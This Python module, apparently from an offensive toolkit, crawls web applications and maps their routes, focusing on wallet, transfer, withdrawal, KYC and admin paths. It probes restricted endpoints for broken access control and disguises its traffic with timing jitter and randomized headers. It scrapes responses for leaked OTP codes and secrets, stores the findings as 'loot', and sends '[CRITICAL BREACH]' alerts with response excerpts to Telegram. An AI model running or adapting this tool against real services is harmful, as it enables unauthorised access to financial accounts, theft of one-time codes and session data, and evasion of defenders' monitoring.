#!/usr/bin/env python3
"""
CRAWLER.PY v8.8 — Route Discovery, DOM Form & Response Differential Mapper
"""
import asyncio
import hashlib
import json
import re
import sys
from urllib.parse import urljoin, urlparse

from bs4 import BeautifulSoup

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.response_diff import ResponseFingerprinter
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof

try:
    import esprima

    HAS_ESPRIMA = True
except ImportError:
    HAS_ESPRIMA = False

OTP_DEBUG_KEYS = ["otp", "code", "pin", "debug", "token", "verification", "secret", "auth_code"]

HIGH_VALUE_KEYWORDS = [
    "critical",
    "bypass",
    "success",
    "loot",
    "token",
    "session",
    "admin",
    "credential",
    "compromised",
    "race",
    "pivot",
    "jwt",
    "dump",
    "bola",
    "secret",
]

STATIC_EXTENSIONS = (
    ".png",
    ".jpg",
    ".jpeg",
    ".css",
    ".ico",
    ".svg",
    ".woff",
    ".woff2",
    ".gif",
    ".map",
)


class ApplicationState:
    UNAUTHENTICATED = 0
    KYC_PENDING = 1
    AUTHENTICATED_ACTIVE = 2
    PRIVILEGED_ADMIN = 3


class StateMachineMapper:
    def __init__(self, fingerprinter: ResponseFingerprinter | None = None):
        self.fingerprinter = fingerprinter or ResponseFingerprinter()
        self.state_graph = {
            ApplicationState.UNAUTHENTICATED: set(),
            ApplicationState.KYC_PENDING: set(),
            ApplicationState.AUTHENTICATED_ACTIVE: set(),
            ApplicationState.PRIVILEGED_ADMIN: set(),
        }

    def classify_endpoint(self, url):
        lower_url = str(url or "").lower()
        if any(k in lower_url for k in ("admin", "root", "manage", "config", "dashboard/admin")):
            return ApplicationState.PRIVILEGED_ADMIN
        if any(
            k in lower_url
            for k in (
                "transfer",
                "withdraw",
                "dashboard",
                "account",
                "settings",
                "wallet",
                "transaction",
                "balance",
                "portfolio",
                "assets",
            )
        ):
            return ApplicationState.AUTHENTICATED_ACTIVE
        if any(k in lower_url for k in ("kyc", "verify", "onboarding", "identity", "step-2")):
            return ApplicationState.KYC_PENDING
        return ApplicationState.UNAUTHENTICATED

    def build_graph(self, endpoints):
        for ep in endpoints:
            state = self.classify_endpoint(ep)
            self.state_graph[state].add(ep)
        return self.state_graph

    def evaluate_state_skipping(self, transport):
        sys.stdout.write("\033[95m[***] EVALUATING ENDPOINT ACCESS & DIFFERENTIAL BASELINES [***]\033[0m\n")
        sys.stdout.flush()

        anomalies = []
        restricted_endpoints = self.state_graph[ApplicationState.AUTHENTICATED_ACTIVE].union(
            self.state_graph[ApplicationState.PRIVILEGED_ADMIN]
        )

        # Capture a non-existent path baseline once if available
        if "soft_404" not in self.fingerprinter.baselines:
            b_status, b_headers, b_body = transport.request(
                "GET", "/__nonexistent_probe_baseline_check__", extra_headers=get_randomized_hints()
            )
            if b_status:
                self.fingerprinter.capture_baseline("soft_404", b_status, b_body or "", b_headers or {})

        for ep in sorted(restricted_endpoints):
            apply_behavioral_jitter()
            random_headers = get_randomized_hints()
            status, headers, body = transport.request("GET", ep, extra_headers=random_headers)

            if not isinstance(body, str):
                body = str(body or "")

            is_fp, _ = self.fingerprinter.is_false_positive(status, body, headers or {})
            lower_body = body.lower()
            looks_like_auth_gate = any(
                term in lower_body for term in ("sign in", "log in", "login", "password", "auth-form")
            )

            if status in (200, 201) and not is_fp and not looks_like_auth_gate and len(body.strip()) > 0:
                sys.stdout.write(
                    f"\033[91m[!] Differential response anomaly on {ep} [HTTP {status}]\033[0m\n"
                )
                anomalies.append(ep)

                loot_hash = hashlib.sha256(body.encode("utf-8", errors="ignore")).hexdigest()
                loot_payload = {
                    "endpoint": ep,
                    "status": status,
                    "integrity_hash": loot_hash,
                    "response_snippet": body[:400],
                }

                stream_proof(
                    "ENDPOINT_ACCESS_ANOMALY",
                    ep,
                    {"method": "GET"},
                    body[:300],
                    loot_payload,
                )

                save_session_loot(
                    target=getattr(transport, "base_path", "target"),
                    endpoint=ep,
                    finding_type="ENDPOINT_ACCESS_ANOMALY",
                    status=status,
                    headers=headers or {},
                    body=body,
                    extra_loot=loot_payload,
                )

                broadcast_tg_alert_sync("Endpoint Access Anomaly Confirmed", loot_payload)
            else:
                sys.stdout.write(
                    f"\033[90m[-] Filtered or protected endpoint {ep} [HTTP {status}]\033[0m\n"
                )
            sys.stdout.flush()

        return anomalies


def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Schedules notifications non-blockingly when invoked from synchronous code."""
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            task.add_done_callback(lambda t: t.exception() if not t.cancelled() else None)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def inspect_js_bundle_ast(js_content):
    discovered_routes = set()
    if not HAS_ESPRIMA or not isinstance(js_content, str) or len(js_content) > 2_500_000:
        return discovered_routes, {}

    try:
        syntax = esprima.parseScript(js_content, tolerant=True)

        def walk(node):
            if isinstance(node, dict):
                if node.get("type") == "Literal" and isinstance(node.get("value"), str):
                    val = node["value"].strip()
                    if (
                        val.startswith("/")
                        and len(val) > 1
                        and " " not in val
                        and not val.lower().endswith(STATIC_EXTENSIONS)
                    ):
                        discovered_routes.add(val)
                for v in node.values():
                    if isinstance(v, dict):
                        walk(v)
                    elif isinstance(v, list):
                        for item in v:
                            if isinstance(item, dict):
                                walk(item)

        tree = syntax.toDict() if hasattr(syntax, "toDict") else syntax.__dict__
        walk(tree)
    except Exception:
        pass

    return discovered_routes, {}


def inspect_json_for_leaked_codes(response_body):
    leaked_codes = {}
    if not response_body or not isinstance(response_body, str):
        return leaked_codes

    try:
        data = json.loads(response_body)
        if isinstance(data, dict):
            for key, value in data.items():
                if any(k in str(key).lower() for k in OTP_DEBUG_KEYS):
                    leaked_codes[key] = value
    except json.JSONDecodeError:
        pass

    for key in OTP_DEBUG_KEYS:
        pattern = r"['\"]?" + re.escape(key) + r"['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{4,12})['\"]?"
        match = re.search(pattern, response_body, re.I)
        if match and key not in leaked_codes:
            leaked_codes[key] = match.group(1)

    return leaked_codes


def analyze_form_inputs(html_content):
    forms_intel = []
    if not isinstance(html_content, str) or not html_content:
        return forms_intel
    try:
        soup = BeautifulSoup(html_content, "html.parser")
        for form in soup.find_all("form"):
            action = form.get("action", "")
            method = str(form.get("method", "GET")).upper()
            inputs = []

            for inp in form.find_all(["input", "select"]):
                name = inp.get("name")
                if not name:
                    continue
                input_type = str(inp.get("type", "text")).lower()
                value = inp.get("value", "")
                inputs.append({"name": name, "type": input_type, "default": value})

            forms_intel.append({
                "action": action,
                "method": method,
                "inputs": inputs,
            })
    except Exception as exc:
        log(f"[-] DOM Form parsing warning: {exc}", "\033[93m")

    return forms_intel


def intelligent_auth_probe(transport, discovered_endpoints, form_intels, allow_mutations: bool = False):
    """Maps discovered auth/form endpoints and inspects responses without mutating state by default."""
    log("[*] Mapping discovered forms and auth endpoints...", "\033[94m")

    leaked_secrets = {}
    session_output = getattr(transport, "cookie_jar", {})
    operator_creds = {}

    if not allow_mutations:
        return session_output, operator_creds, leaked_secrets

    for form in form_intels:
        action_url = form.get("action")
        method = str(form.get("method", "GET")).upper()
        if not action_url or not action_url.startswith("/"):
            continue
        if method == "GET":
            apply_behavioral_jitter()
            _, _, body = transport.request("GET", action_url, extra_headers=get_randomized_hints())
            detected_codes = inspect_json_for_leaked_codes(body)
            if detected_codes:
                leaked_secrets.update(detected_codes)

    return session_output, operator_creds, leaked_secrets


def crawl_target(transport, allow_mutations: bool = False):
    log("\n[***] INITIALIZING STATEFUL RECON & DOM CRAWLER (v8.8) [***]", "\033[95m")
    discovered_endpoints = set()
    discovered_scripts = set()
    all_forms_intel = []
    fingerprinter = ResponseFingerprinter()

    seed_paths = [
        getattr(transport, "base_path", "") or "/",
        "/homepage",
        "/home",
        "/wallet",
        "/transaction",
        "/transactions",
        "/login",
        "/api",
        "/api/v1",
        "/api/v1/user",
        "/api/v1/auth/me",
        "/api/v1/user/profile",
        "/api/v1/wallet",
        "/signup",
        "/dashboard",
        "/admin",
        "/settings",
        "/transfer",
        "/user/register",
        "/user/wallet",
        "/user/dashboard",
        "/api/user/wallet",
    ]

    href_pattern = re.compile(r'href=["\']([^"\']+)["\']', re.I)
    action_pattern = re.compile(r'action=["\']([^"\']+)["\']', re.I)
    api_pattern = re.compile(r'["\'](/api/[^"\']+)["\']', re.I)
    script_pattern = re.compile(r'src=["\']([^"\']+\.js[^"\']*)["\']', re.I)
    endpoint_in_js = re.compile(r'["\'](/v?\d?/[a-zA-Z0-9_/_-]+)["\']', re.I)

    for path in seed_paths:
        apply_behavioral_jitter()
        random_headers = get_randomized_hints()
        status, headers, html = transport.request("GET", path, extra_headers=random_headers)
        if not status or not isinstance(html, str):
            continue

        is_fp, _ = fingerprinter.is_false_positive(status, html, headers or {})
        if not is_fp:
            discovered_endpoints.add(path)

        forms = analyze_form_inputs(html)
        if forms:
            all_forms_intel.extend(forms)

        for link in href_pattern.findall(html):
            if link.startswith("http"):
                p = urlparse(link)
                if p.hostname and getattr(transport, "host", None) and p.hostname.lower() == transport.host.lower():
                    if p.path:
                        discovered_endpoints.add(p.path)
            elif link.startswith("/"):
                discovered_endpoints.add(link)

        for action in action_pattern.findall(html):
            if action.startswith("/"):
                discovered_endpoints.add(action)

        for api in api_pattern.findall(html):
            discovered_endpoints.add(api)

        for script in script_pattern.findall(html):
            if script.startswith("/"):
                discovered_scripts.add(script)
            elif not script.startswith("http"):
                discovered_scripts.add(urljoin(path, script))

    for script_path in sorted(discovered_scripts)[:15]:
        apply_behavioral_jitter()
        s_status, _, s_content = transport.request("GET", script_path, extra_headers=get_randomized_hints())
        if s_status == 200 and isinstance(s_content, str):
            for match in endpoint_in_js.findall(s_content):
                if len(match) > 3 and not match.lower().endswith(STATIC_EXTENSIONS):
                    discovered_endpoints.add(match)

            try:
                ast_routes, _ = inspect_js_bundle_ast(s_content)
                for route in ast_routes:
                    discovered_endpoints.add(route)
            except Exception:
                pass

    filtered_endpoints = sorted({
        ep
        for ep in discovered_endpoints
        if not str(ep).lower().endswith(STATIC_EXTENSIONS)
    })

    mapper = StateMachineMapper(fingerprinter=fingerprinter)
    state_graph = mapper.build_graph(filtered_endpoints)
    bola_vulns = mapper.evaluate_state_skipping(transport)

    session_cookie, operator_creds, leaked_secrets = intelligent_auth_probe(
        transport, filtered_endpoints, all_forms_intel, allow_mutations=allow_mutations
    )

    crawl_loot = {
        "endpoints_count": len(filtered_endpoints),
        "bola_count": len(bola_vulns),
        "endpoints": filtered_endpoints,
        "bola_vulnerabilities": bola_vulns,
        "leaked_secrets": leaked_secrets,
    }
    save_session_loot(
        target=getattr(transport, "base_path", "target"),
        endpoint="crawler_recon",
        finding_type="CRAWLER_STATE_MAPPING_SUCCESS",
        status=200,
        headers={},
        body=json.dumps(crawl_loot),
        extra_loot=crawl_loot,
    )

    return {
        "endpoints": filtered_endpoints,
        "state_graph": state_graph,
        "bola_vulnerabilities": bola_vulns,
        "session_cookie": session_cookie,
        "operator_credentials": operator_creds,
        "leaked_secrets": leaked_secrets,
    }
